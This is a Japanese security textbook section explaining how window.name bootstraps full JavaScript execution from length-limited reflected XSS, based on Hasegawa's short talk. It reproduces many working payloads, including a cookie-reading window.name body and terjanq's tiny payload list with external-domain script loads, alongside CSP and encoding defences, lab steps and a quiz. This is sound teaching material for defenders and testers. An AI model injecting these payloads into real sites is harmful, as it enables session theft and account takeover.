# 最短の XSS ―― `window.name` で長さ制限を突破する

> **この節で分かること**
> - 「反射点が短いから XSS にならない」という思い込みがなぜ危険なのかを説明できる
> - `window.name`（ウィンドウ名）がなぜ XSS の「ブートストラップ」に使えるのかを、その3つの性質から説明できる
> - `<svg/onload=eval(name)>` や `<i/onclick=URL=name>` などの極小ペイロードが何をしているかを展開形で読み解ける
> - 長さ制限（length-limited sink）のある反射点を見つけたとき、診断者としてどんな追加検証をすべきか判断できる
> - 長さベースのフィルタが不十分な理由と、出力エンコード・CSP による正しい防御を説明できる

**元資料**: https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss （原典は取得できず二次情報ベース。はせがわ氏 PPT を本人許諾で引用した解説と terjanq/Tiny-XSS-Payloads を GitHub 経由で全文取得して裏取り）
**関連する節**: XSS の基礎（反射型 XSS）、CSP、同一オリジンポリシー

---

## 1. この節のテーマ ―― 「任意コードを実行できる最短の XSS は何文字か」

この節が題材にするのは、はせがわようすけ（Yosuke Hasegawa）氏によるショートトーク「**Short talk of XSS - 短いXSSの話 -**」である。ショートトーク（short talk / LT）とは、数分程度の短い発表のこと。テーマはひとことで言うと「**任意の JavaScript を実行できる、できる限り短い XSS ペイロードは何文字になるか**」という探求である。

一見すると、これは「短く書けたら偉い」というパズル遊びに見える。しかし診断・バグバウンティの現場では、これはきわめて実務的なテーマだ。というのも、Web アプリの反射点（入力値が出力に現れる場所）には、しばしば「ここには 20 文字までしか入らない」といった**長さ制限**があるからである。

「20 文字しか入らないなら XSS は無理だろう」と切り捨てたくなる。だが本トークが示すのは、**数十文字どころか十数文字の反射点でも、完全な任意コード実行（RCE 相当）に化ける**という事実である。その鍵が、この節の主役である `window.name` だ。

### なぜこのテーマが「基盤技術」なのか

クライアントサイド脆弱性ハンティングでは、「sink（出力先）の長さは安全性の指標にならない」という原則を体に叩き込む必要がある。短い反射・短い属性値・短い URL 断片でも XSS になりうる。この原則を、具体的なペイロードとともに理解するのが本節のゴールである。

> 〔補足〕本トークの発表メタ情報について。複数の二次情報（検索要約）は、これを **OWASP Japan 2nd Local Chapter Meeting（2012年6月27日）** での発表としている。発表者のはせがわようすけ氏は、当時 NetAgent 所属（後に SecureSky Technology CTO）。連絡先として `@hasegawayosuke` と `http://utf-8.jp/` が資料内に記載されているという。ブラウザの文字コード処理・XSS・mutation XSS(mXSS) などで著名な日本のセキュリティ研究者である。これらのメタ情報は原典スライドを直接取得できなかったため二次情報にもとづく。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Short talk of XSS - 短いXSSの話 -（はせがわようすけ / docswell） — https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限。docswell.com が egress プロキシで 403 ブロックされ、WebFetch も curl も通らなかった）。以下の記述は、はせがわ氏 PPT を本人許諾で引用した二次資料（GitHub 上の「Short XSS」ペーパー）と、terjanq/Tiny-XSS-Payloads README の逐語、および検索要約にもとづく要約である。
> **読みどころ**:
> 1. 各ペイロードの**正確な逐語表記と文字数カウント**（本節に出てくる 26/28/23/22/21 などの数値は二次情報由来なので、原典で確定させること）。
> 2. `window.name` を使う短縮ステップの**具体的な段階**（どの形からどの形へ、なぜ短くなるか）。
> 3. **ブラウザ差**（IE の `URL`/`location` 代入挙動など、当時のブラウザ固有トリック）。
> 4. 「最短」を主張する前提条件（許可される文字集合・注入コンテキスト・イベントハンドラの選択）。
> 5. デモ／スクリーンショットがあれば、実際の反射コンテキストの形。
> **代替手段**: はせがわ氏 PPT を本人許諾で引用した中国語解説「Short XSS」（GitHub ミラー、後述の出典参照）と、terjanq/Tiny-XSS-Payloads（デモ: https://tinyxss.terjanq.me ）。原典スライドの代替ではないが、手法・展開形・文字数を裏取りできる。

---

## 2. 素朴な形から短縮していく ―― 検索要約が示す代表ペイロード

原典スライドは「素朴な形を出し、そこから `window.name` を活用して段階的に短くしていく」という流れだと二次情報は伝えている。まず全体像として、代表的なペイロードと（二次情報が提示した）文字数を並べておく。

### 代表ペイロードと文字数（数値は二次情報由来）

```text
<script>alert(1)</script>              ← 素朴な形（要約は「26 文字」と提示）
<script>eval(name)</script>            ← window.name を eval する形（要約は「28 文字」と提示）
<svg/onload=eval(name)>                ← 短縮形。TinyXSS 系でも「23」とされる
<svg/onload=location=name>             ← eval が使えない（unsafe-eval 無効）環境向けの代替
<i/onclick=URL=name>                   ← IE 系のさらに短い形（要約は「約21 文字」と提示）
```

ここで重要なのは**個々の文字数の正確さではなく、短縮の方向性**である。すなわち「タグを閉じない」「イベントハンドラを使う」「`window.name` に本体コードを逃がす」という3つの発想だ。

### 文字数は「数え方」と「文脈」で変わる

上の数値（26/28/23/21 など）は検索要約が返した値であり、原典スライドの厳密なカウントと一致する保証はない。とくに「最短」を主張する数値は、**許可される文字集合・ブラウザ・注入コンテキスト**に強く依存する。

たとえば後述するように、`<svg/onload=eval(name)` は閉じタグ `>` を省略すれば 22 文字、`>` を含めれば 23 文字である。どちらが「正しい」というより、**数え方の前提を明示することが正確さ**である。診断レポートで「N 文字で XSS 可能」と書くときは、必ず前提条件（文字集合・コンテキスト・ブラウザ）を添えること。

---

## 3. 中核メカニズム ―― `window.name` はなぜブートストラップに使えるのか

ここからが本トークの肝である。短い反射点に収まる**小さなスタブ**から、実質的に無制限の JavaScript を実行する手法を見ていく。

### なぜこうなっているのか（`window.name` の性質）

`window.name`（ウィンドウ名）とは、ブラウザの各ウィンドウ／タブが持つ「名前」を表すプロパティのこと。本来は `<a target="...">` や `window.open(url, name)` でウィンドウを識別するために使われる、ごく普通の機能である。ところがこの `window.name` には、攻撃に都合のよい3つの性質がある。

| 性質 | 内容 | 攻撃上の意味 |
|---|---|---|
| 長さ無制限 | DOMString で、保持できる長さに事実上制限がない | 大きな JS ソースをまるごと入れられる |
| 任意 Unicode | どんな Unicode 文字でも保持できる | エンコード制約を受けにくい |
| 遷移で持続 | **クロスオリジン遷移でもリセットされない** | 別ドメインへ飛んでも値が残る |

3つ目の「クロスオリジン遷移でリセットされない」が決定的である。ふつう、あるサイトの JavaScript の状態は別サイトへ遷移すれば消える（同一オリジンポリシー, Same-Origin Policy, SOP の帰結）。だが `window.name` だけは例外的に、ドメインをまたいでも値が持続する。この「橋渡し」の性質が悪用される。

### どう動くのか（ブートストラップの流れ）

攻撃・検証シナリオ（防御・診断目的の解説）は次のようになる。

```text
[攻撃者が支配するページ evil.example]
   window.name = "<大きな JS ソース>"        ← ここに本体コードを丸ごと入れる
        │
        │  遷移（クロスオリジン。window.name は消えない）
        ▼
[脆弱なページ example.com（長さ制限つき反射 XSS を持つ）]
   注入するのは短いスタブだけ:
      eval(name)          ← window.name の中身を JavaScript として評価
      location=name       ← window.name の javascript: URL へ遷移して実行
```

1. 攻撃者が支配するページで `window.name = "<大きな JS ソース>"` を設定する。
2. そのページから、長さ制限のある反射 XSS を持つ脆弱ページへ遷移させる。
3. 遷移先では**短いスタブだけ**を注入すれば足りる。スタブが `window.name` の中身を実行する。
   - eval 系: `eval(name)` … `name`（= `window.name`）を JavaScript として評価。
   - 遷移系（eval / unsafe-eval が使えないとき）: `location=name` … `window.name` に `javascript:...` を入れておき、それを `location`（＝ページ遷移先）に代入して実行させる。IE では `URL` への代入も同種のトリックとして使える。
4. 実際の遷移では見た目上どこにも飛ばないよう構成でき、透過的に成立しうる。

### 具体的なペイロード（逐語。二次情報由来。診断・許可された検証目的）

`window.name` に入れる本体側の例:

```javascript
window.name="javascript:alert((window.opener||window).document.cookie);"
```

脆弱ページ側に注入するスタブの例:

```html
<svg/onload=eval(name)>
<svg/onload=location=name>
<i/onclick=URL=name>
<script>eval(name)</script>
```

> 〔補足〕`window.name` トリックは Gareth Heyes（The Spanner, 2007「Window name trick」）や Giorgio Maone らが初期に示した手法で、はせがわ氏の本トークはこれを「最短 XSS」の文脈で整理・拡張したものと複数の二次情報が位置づけている。Mozilla の Bugzilla 444222「window.name can be used as an XSS attack vector」も同じ性質を扱う一次情報である。

> ### 📌 ここは自分で開いて読んでください
> **資料**: The Spanner「Window name trick」／ Mozilla Bugzilla 444222 — https://thespanner.co.uk/window-name-trick ／ https://bugzilla.mozilla.org/show_bug.cgi?id=444222
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限。thespanner.co.uk・bugzilla.mozilla.org とも egress プロキシで 403 ブロックされた）。以下の記述は検索要約と周辺の公開資料にもとづく。
> **読みどころ**:
> 1. `window.name` がクロスオリジンで持続する原理（`eval(name)`／`location=name` の元ネタ）。
> 2. Bugzilla 444222 では、`window.name` を XSS ベクタとして扱う一次的なバグ議論そのものを読める。
> **代替手段**: なし（原典ページはいずれも要アクセス）。

---

## 4. 展開形で読み解く ―― 省略記法が何をしているか

`<svg/onload=eval(name)>` のような書き方は、慣れないと呪文に見える。だが、はせがわ氏 PPT を本人許諾で引用した解説（GitHub 上の「Short XSS」ペーパー）は、各形の**展開形（省略記法を元に戻した形）**を与えている。これを見ると仕組みが一目で分かる。

### 展開形の対応表

| 省略記法（実際に注入する形） | 展開形（意味） | 何をしているか |
|---|---|---|
| `<svg/onload=eval(name)>` | `<svg/onload=eval(window.name)>` | svg の onload 発火時に `window.name` を `eval` に渡して実行 |
| `<i/onclick=URL=name>` | `<i/onclick=document.URL=window.name>` | クリックで `document.URL` に `window.name` を代入し、`javascript:alert(1)` を実行 |
| `<img src=x onerror=eval(name)>` | `<img src=x onerror=eval(window.name)>` | img の読み込み失敗 → onerror で `window.name` を eval |
| `<svg/onload=domain=id>` | `<svg/onload=document.domain=id>` | `document.domain` を書き換えて同一ドメイン化（後述、短縮とは別系統） |

ポイントは2つ。まず `/`（スラッシュ）は、タグ名と属性の区切りとして空白の代わりに使える。`<svg onload=...>` と `<svg/onload=...>` は同じ意味だが、後者はフィルタ回避や見た目の短縮に役立つ。次に `name` は `window.name` の、`URL` は `document.URL` の省略である。ブラウザはグローバルスコープでこれらを省略形で参照できるため、そのぶん文字数が減る。

### 攻撃ページと脆弱ページの「対」の構成

引用元の解説は、検証構成を具体的に示している。攻撃ページ側に

```html
<iframe src="11.html" name="alert(1)">
```

を置き（この `name="alert(1)"` が `window.name` になる）、脆弱ページ側（11.html 相当）に

```html
<svg/onload=eval(name)>
```

を注入する。すると `window.name` の中身 `alert(1)` が `eval` され実行される。つまり「本体は name に入れ、遷移先の短いスタブで実行する」という、第3節で説明した流れそのものである。

> 出典: su18/wooyun-drops「Short XSS」（同ペーパーは「以下ははせがわ氏 PPT の一部を本人同意のうえ引用」と明記している）。

---

## 5. どこまで短くなるか ―― 具体的な文字数

はせがわ氏 PPT を引用した別ミラー（WIKI-POC-EXP「0243-Short XSS」の「挑戦最短」章）は、海外の XSS チャレンジを引きつつ、より短い形と具体的な文字数を挙げている。これらは実データとして取得・精読された値である。

### 短縮ペイロードの文字数

| ペイロード | 文字数 | 備考 |
|---|---|---|
| `<x/x=&{eval(name)};` | 19 文字 | Firefox の E4X（`&{...}` 埋め込み）を使う超短縮形 |
| `<svg/onload=eval(name)` | 22 文字 | 閉じ `>` を省略した数え方（ブラウザが自動補完） |
| `<svg/onload=eval(name)>` | 23 文字 | 上と同じ形で `>` を含めた数え方 |

E4X（ECMAScript for XML）とは、かつて Firefox が実装していた JavaScript の拡張で、`&{...}` の形でコードを埋め込めた仕組みのこと。現在は廃止されている。ここで重要なのは、22 と 23 の差は「閉じタグを数えるかどうか」の違いにすぎない、という点だ。第2節で触れたとおり、文字数は数え方の前提で変わる。

### 「JS 実行断片」だけの最短

さらに、タグを取り払った「実行に効く JavaScript の断片」だけを見ると、次のように縮む。

| 断片 | 文字数 | 展開・前提 |
|---|---|---|
| `eval(name)` | 10 文字 | `window.name` を eval |
| `eval(URL)` | 9 文字 | `document.URL` を eval |
| `URL=name` | 8 文字 | `document.URL=window.name` の省略で遷移実行 |
| `$(URL)` | 6 文字 | `$`（jQuery 等）が定義済みである前提 |

`$(URL)` の 6 文字が最短候補として挙がっているが、これは「jQuery が読み込まれている」という前提つきである。ここでも「最短」は文脈依存だと分かる。

> 出典: govbk/WIKI-POC-EXP「0243-Short XSS」0x04「挑戦最短」章（逐語）。これらの数値は、はせがわ氏 PPT を引用したペーパーおよび海外チャレンジ由来の値であり、原典 docswell スライドの各ページの厳密なカウントは未取得である。ただし手法とオーダー（十数〜二十数文字）は実データで確認できている。

---

## 6. 実世界の実例 ―― `*.live.com` のエラーメッセージ反射

「短い反射でも危ない」という主張を裏付ける具体例が、はせがわ氏 PPT から引用されている。

### どこを突かれたか

Microsoft の `*.live.com` で、**ASP.NET のリクエスト検証エラーメッセージ**が入力値をそのまま反映して XSS になっていた、という実例である。ASP.NET には、危険そうな入力を検出するとエラーページを出す「リクエスト検証（Request Validation）」という機能がある。ところが、そのエラーメッセージが**検出した入力値そのものを画面に埋め込んで**しまっていた。

再現 URL の形は次のとおり。

```text
https://*.live.com/?param=><h1>XSSed</h1><!--
```

返る HTML の中に、次のようなエラーメッセージが現れた。

```text
A potentially dangerous Request.QueryString value was detected from the client (param="><h1>XSSed</h1><!--")
```

つまり「危険な値を検出しました」というメッセージ自体が、その危険な値をそのまま出力してしまい、**エラーメッセージ経由の反射 XSS**が成立していた。

### この実例の教訓

古典的だが今も通用する教訓が2つある。第一に、**「入力を弾いたつもりのエラーメッセージ」自体が反射点になりうる**。WAF やフレームワークの検証失敗表示は、診断者が真っ先に疑うべき場所である。第二に、そこに長さ制限があっても、`window.name` ブートストラップを組み合わせれば完全な任意コード実行に化ける。本トックの主旨を裏付ける、リアルな例である。

> 出典: su18/wooyun-drops「Short XSS」0x03「実例」節（はせがわ氏 PPT からの引用として掲載）。

---

## 7. 現代版への発展 ―― terjanq/Tiny-XSS-Payloads

本トークの `<svg/onload=eval(name)>` 系は、その後どう体系化されたか。terjanq 氏の Tiny-XSS-Payloads（デモ: https://tinyxss.terjanq.me ）は、**コンテキスト別の極小ペイロード集**として整理されている。README 全文が GitHub 経由で取得できたので、逐語で示す。

### コンテキスト別の極小ペイロード（逐語）

```html
<base/href=//Ǌ.₨>                          <!-- sink の後に相対 script が挿入される場合 -->
<svg/onload=eval(name)>                     <!-- 反射 XSS 限定。window.name を eval -->
<svg/onload=eval(`'`+URL)>                  <!-- URL を制御できる場合 -->
<svg/onload=location=name>                  <!-- name 制御可 & unsafe-eval 無効時（javascript: を name に） -->
<svg><svg/onload=eval(name)>                <!-- Chrome では未挿入要素の innerHTML でも発火 -->
<audio/src/onerror=eval(name)>              <!-- name 制御時、innerHTML でも発火 -->
<img/src/onerror=eval(`'`+URL)>             <!-- URL 制御時、innerHTML でも発火 -->
<script/src=//Ǌ.₨></script>                <!-- 単純な外部スクリプト -->
<iframe/onload=src=top.name>                <!-- window の name を制御できる場合 -->
<iframe/onload=eval(`'`+URL)>               <!-- URL 制御時 -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>    <!-- ページ内 iframe 数が一定の場合 -->
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">   <!-- Firefox 限定 -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/> <!-- iframe 数がランダムの場合 -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">  <!-- CSP で unsafe-inline 無効 & 外部 script 許可時 -->
<style/onload=eval(name)>                   <!-- インラインスタイル許可時 -->
<style/onload=eval(`'`+URL)>                <!-- インラインスタイル許可 & URL 制御時 -->
<style/onerror=eval(name)>                  <!-- インラインスタイル遮断時 -->
<svg/onload=import(/\\Ǌ.₨/)>               <!-- 動的 import で外部スクリプト。https & Chrome のみ -->
<style/onload=import(/\\Ǌ.₨/)>             <!-- 同上（style 経由） -->
<iframe/onload=import(/\\Ǌ.₨/)>            <!-- 同上（iframe 経由） -->
<!-- Deprecated（Safari 限定・過去形） -->
<iframe/onload=write(URL)>
<style/onload=write(URL)>
```

### `Ǌ.₨` という1文字ドメインのトリック

このリストで目を引く `Ǌ.₨` は、Unicode の正規化を悪用したテクニックである。ブラウザは URL を処理する際に NFKC という正規化をかけることがあり、その結果 `Ǌ.₨` が `nJ.rs`（実在の短ドメイン）に化ける。つまり見た目より少ない文字数で攻撃者ドメインを指せる。

`<base/href=//Ǌ.₨>` は、`<base>` タグで以降の相対 URL の基点を攻撃者ドメインへ変える古典テクだ。いずれも「限られた文字数で任意コードへ橋渡しする」という本トークの発想の延長線上にある。

> 出典: terjanq/Tiny-XSS-Payloads README（https://github.com/terjanq/Tiny-XSS-Payloads ）。

---

## 8. 別系統のトリック ―― `document.domain` による同一ドメイン化

短縮とは別の系統だが、同じ解説に登場するので触れておく。`<svg/onload=domain=id>`（展開形 `<svg/onload=document.domain=id>`）は、文字数短縮の話ではなく、**オリジンを緩める攻撃**である。

`document.domain` とは、同一オリジンポリシーの判定に使われるドメイン値のこと。かつてのブラウザでは、これを書き換えることで、本来は別扱いのドキュメント同士を「同じドメイン」とみなさせ、クロスドキュメントの DOM アクセスを可能にできた。引用元は Chrome で `document.domain=""` を悪用する例を図解している。

教科書的には、これは「短縮 XSS」とは切り離して「同一オリジンを緩める別系統の攻撃」と位置づけると混乱しない。`window.name` が「長さ制限の突破」なら、`document.domain` は「オリジン境界の突破」である。

> 出典: su18/wooyun-drops「Short XSS」。

---

## 9. 攻撃者はどこを突くのか ―― ハンターの視点でまとめる

ここまでを、脆弱性ハンター／診断者の実務行動に落とし込む。

### 長さ制限の反射を見つけたら試すこと

- **length-limited な反射を見つけたら、そこで諦めない**。`window.name` 経路（`eval(name)` / `location=name`）を必ず試す。
- 反射コンテキストを見極める。タグの中に入るのか、属性値なのか、`javascript:` を使える URL 断片なのか。terjanq のリストは「どのコンテキストならどのペイロード」の対応表として使える。
- eval が塞がれている（CSP の `unsafe-eval` 無効）なら、遷移系 `location=name` に切り替える。
- エラーメッセージ（WAF・フレームワークの検証失敗表示）を疑う。`*.live.com` の例のように、弾いたはずの値が反射点になる。

### 検証は必ず許可の範囲で

これらの手法は、**許可された診断・バグバウンティ・自分で立てた検証環境**でのみ試すこと。他者のサイトへ無断でペイロードを撃つのは不正アクセスにあたりうる。

---

## 10. どう守るのか ―― 長さフィルタは緩和策にならない

最後に防御である。本トークの最大の教訓は防御側にこそ効く。

### 出力エンコードは長さに関わらず必須

「反射点が短いから XSS にならない」という思い込みは危険である。数十文字、いや十数文字の反射でも `window.name` ブートストラップで完全な任意コード実行に化ける。したがって**出力エンコーディングは長さに関わらず必須**であり、長さベースのフィルタは緩和策として不十分だ。

### CSP で eval 経路と `javascript:` 経路の両方を塞ぐ

CSP（Content Security Policy, コンテンツセキュリティポリシー）とは、ブラウザに「どこからのスクリプトを実行してよいか」を指示する仕組みのこと。本トークの手法に対しては、次の2経路を同時に塞ぐのが現実的な多層防御である。

| 攻撃経路 | 防御 |
|---|---|
| `eval(name)`（eval 実行） | CSP で `unsafe-eval` を無効化する |
| `location=name`（`javascript:` 遷移） | `javascript:` スキーム遷移を塞ぐ（CSP の `navigate-to`、リンク検証など） |
| 外部スクリプト読み込み | `script-src` を厳格化し、許可オリジンを絞る |

まとめると、防御の基本は次の組み合わせである。

```text
文脈依存の出力エンコード          … 反射点の長さに関わらず、コンテキストに応じてエスケープ
   ＋
CSP（unsafe-eval 無効 / 厳格 script-src） … eval 経路と外部 script 経路を塞ぐ
   ＋
javascript: 遷移の遮断             … location=name / URL=name 経路を塞ぐ
```

---

## 手を動かす

以下は**自分で立てた検証環境**でのみ行うこと。

1. ローカルに2つの HTML ファイルを用意する。攻撃ページ役 `attacker.html` と、脆弱ページ役 `victim.html` である。
2. `attacker.html` に、`window.name` をセットして遷移するコードを書く。たとえば iframe を使う形:
   ```html
   <iframe src="victim.html" name="alert(document.domain)"></iframe>
   ```
3. `victim.html` に、短いスタブだけを注入したと想定して置く:
   ```html
   <svg/onload=eval(name)>
   ```
4. `attacker.html` をブラウザで開く。iframe 内の `victim.html` が読み込まれ、`window.name`（= `alert(document.domain)`）が `eval` され、アラートが出れば成立である。
5. 次に、eval を封じた状況を再現する。`victim.html` を配信するローカルサーバに CSP ヘッダ `Content-Security-Policy: script-src 'self'`（`unsafe-eval` なし）を付け、`<svg/onload=eval(name)>` がブロックされることを確認する。
6. 代替として遷移系を試す。`name` に `javascript:alert(1)` を入れ、スタブを `<svg/onload=location=name>` に変えて、こちらは通るか／CSP でどう塞がるかを観察する。
7. terjanq のデモ https://tinyxss.terjanq.me を開き、コンテキスト別に用意されたペイロードが実際に発火する様子を確認する。

## つまずきポイント

- **文字数を鵜呑みにしない**。本節の 26/28/23/22/21/19/10/9/8/6 といった数値は、数え方（閉じタグを含むか）・ブラウザ・注入コンテキスト・前提ライブラリ（jQuery の有無）によって変わる。「最短」は常に文脈依存である。
- **`name` と `URL` の正体を取り違えない**。ペイロード中の `name` は `window.name`、`URL` は `document.URL` の省略。グローバルスコープだから省略できる。
- **`window.name` が消えると思い込む**。同一オリジンポリシーの直感に反して、`window.name` はクロスオリジン遷移でもリセットされない。これが手法の要である。
- **長さ制限を「緩和策」と誤解する**。20 文字制限があっても XSS は成立する。長さフィルタは防御にならない。
- **`document.domain` トリックを短縮 XSS と混同する**。`<svg/onload=domain=id>` はオリジンを緩める別系統の攻撃で、文字数短縮の話ではない。
- **原典の逐語を確認せずに引用する**。本節の元になった docswell スライドは自動取得できていない。数値・表記・ブラウザ差は原典で確定させること。

## この節のまとめ

- 本トーク「Short talk of XSS」のテーマは「任意コードを実行できる最短の XSS は何文字か」である。
- 反射点の**長さは安全性の指標にならない**。十数文字の反射でも完全な任意コード実行に化ける。
- 鍵は `window.name`。長さ無制限・任意 Unicode・**クロスオリジン遷移で持続**という3性質を持つ。
- 攻撃者は本体コードを `window.name` に入れ、脆弱ページには短いスタブ（`eval(name)` / `location=name`）だけを注入する。
- `<svg/onload=eval(name)>` の展開形は `<svg/onload=eval(window.name)>`、`<i/onclick=URL=name>` は `<i/onclick=document.URL=window.name>` である。
- 具体的な文字数は、`<svg/onload=eval(name)` で 22（`>` 込みで 23）、`<x/x=&{eval(name)};` で 19、実行断片だけなら `eval(name)`=10 / `URL=name`=8 / `$(URL)`=6 まで縮む。
- 実例として、Microsoft `*.live.com` の ASP.NET リクエスト検証エラーメッセージが入力を反映し、反射 XSS になっていた。
- 「弾いたはずのエラーメッセージ」自体が反射点になりうる、という古典的だが今も通用する教訓がある。
- terjanq/Tiny-XSS-Payloads は、この系統をコンテキスト別に体系化した現代版の実物集である。
- `Ǌ.₨` は Unicode 正規化で `nJ.rs` に化ける「1 文字で短ドメイン」テクである。
- `<svg/onload=domain=id>` はオリジンを緩める別系統の攻撃であり、短縮 XSS とは切り分けて理解する。
- 診断者は、長さ制限の反射を見つけたら `window.name` 経路（`eval(name)` / `location=name`）を必ず試す。
- 防御は**文脈依存の出力エンコード（長さに関わらず必須）＋ CSP（`unsafe-eval` 無効・厳格 `script-src`）＋ `javascript:` 遷移の遮断**。
- これらの検証は許可された環境（診断・バグバウンティ・自作検証環境）でのみ行う。

## 理解度チェック

1. なぜ「反射点が短いから XSS にならない」という判断は危険なのか。
   ▶ 答え: `window.name` を使えば、本体コードを name に逃がし、脆弱ページには短いスタブ（`eval(name)` など）だけを注入すればよいため。数十文字どころか十数文字の反射でも完全な任意コード実行に化ける。長さフィルタは緩和策にならない。

2. `window.name` が XSS のブートストラップに使える理由となる3つの性質を挙げよ。
   ▶ 答え: (1) 保持できる長さに事実上制限がない、(2) 任意の Unicode を保持できる、(3) クロスオリジン遷移でもリセットされない。

3. `<svg/onload=eval(name)>` の展開形は何か。何が実行されるか。
   ▶ 答え: 展開形は `<svg/onload=eval(window.name)>`。svg の onload 発火時に `window.name` の中身を JavaScript として `eval` する。

4. eval が CSP の `unsafe-eval` 無効化で使えないとき、代わりにどんなスタブを使うか。仕組みも述べよ。
   ▶ 答え: `<svg/onload=location=name>`。`window.name` に `javascript:...` を入れておき、それを `location` に代入して遷移＝実行させる。

5. `<svg/onload=eval(name)` が「22 文字」と「23 文字」の2通りで数えられるのはなぜか。
   ▶ 答え: 閉じタグ `>` を省略すればブラウザが自動補完するため 22 文字、`>` を含めれば 23 文字。数え方の前提の違いにすぎない。

6. `*.live.com` の実例で、反射点になっていたのはどこか。教訓は何か。
   ▶ 答え: ASP.NET のリクエスト検証エラーメッセージが、検出した入力値をそのまま画面に反映していた。教訓は「弾いたつもりのエラーメッセージ自体が反射点になりうる」こと。

7. terjanq/Tiny-XSS-Payloads の `<base/href=//Ǌ.₨>` は何をするか。`Ǌ.₨` の役割も述べよ。
   ▶ 答え: `<base>` タグで以降の相対 URL の基点を攻撃者ドメインへ変える。`Ǌ.₨` は Unicode 正規化（NFKC）で `nJ.rs` という実在の短ドメインに化けるため、少ない文字数で攻撃者ドメインを指せる。

8. 本トークの手法に対する防御を、攻撃経路（eval 経路・`javascript:` 遷移経路）ごとに述べよ。
   ▶ 答え: eval 経路は CSP で `unsafe-eval` を無効化する。`javascript:` 遷移経路は `javascript:` スキーム遷移を塞ぐ（CSP の `navigate-to`、リンク検証など）。加えて `script-src` を厳格化し、長さに関わらず文脈依存の出力エンコードを行う。

## 出典

- https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss （原典スライド。本執筆環境からは 403 で取得できず）
- https://www.docswell.com/user/hasegawa （はせがわ氏 docswell プロフィール／全一覧の入口）
- https://raw.githubusercontent.com/su18/wooyun-drops/master/papers/Short%20XSS.md （はせがわ氏 PPT を本人許諾で引用した解説。展開形・`*.live.com` 実例）
- https://raw.githubusercontent.com/govbk/WIKI-POC-EXP/master/Security%20WiKi/011-drops/007-papers/0243-Short%20XSS.md （具体的な文字数を含む「最短」章）
- https://github.com/terjanq/Tiny-XSS-Payloads （デモ: https://tinyxss.terjanq.me 。コンテキスト別の極小ペイロード集）
- https://raw.githubusercontent.com/terjanq/Tiny-XSS-Payloads/master/README.md （README 逐語）
- https://thespanner.co.uk/window-name-trick （The Spanner「Window name trick」。取得できず二次情報）
- https://bugzilla.mozilla.org/show_bug.cgi?id=444222 （Mozilla Bugzilla。取得できず二次情報）
- https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads （PortSwigger。取得できず二次情報）

<!-- sources: https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss, https://raw.githubusercontent.com/su18/wooyun-drops/master/papers/Short%20XSS.md, https://raw.githubusercontent.com/govbk/WIKI-POC-EXP/master/Security%20WiKi/011-drops/007-papers/0243-Short%20XSS.md, https://github.com/terjanq/Tiny-XSS-Payloads, https://raw.githubusercontent.com/terjanq/Tiny-XSS-Payloads/master/README.md, https://thespanner.co.uk/window-name-trick, https://bugzilla.mozilla.org/show_bug.cgi?id=444222, https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads -->
<!-- terms: window.name, ブートストラップ, 反射型XSS, 長さ制限(length-limited sink), 同一オリジンポリシー, CSP, unsafe-eval, eval(name), location=name, document.URL, document.domain, E4X, Tiny-XSS-Payloads, リクエスト検証(Request Validation), Unicode正規化(NFKC), ショートトーク -->
<!-- self-read: https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss | サイト側の制限（docswell が egress プロキシで 403 ブロック）で原典スライドの逐語を取得できず -->
<!-- self-read: https://thespanner.co.uk/window-name-trick | サイト側の制限（403 ブロック）で取得できず、window.name トリックの一次記事は要自読 -->
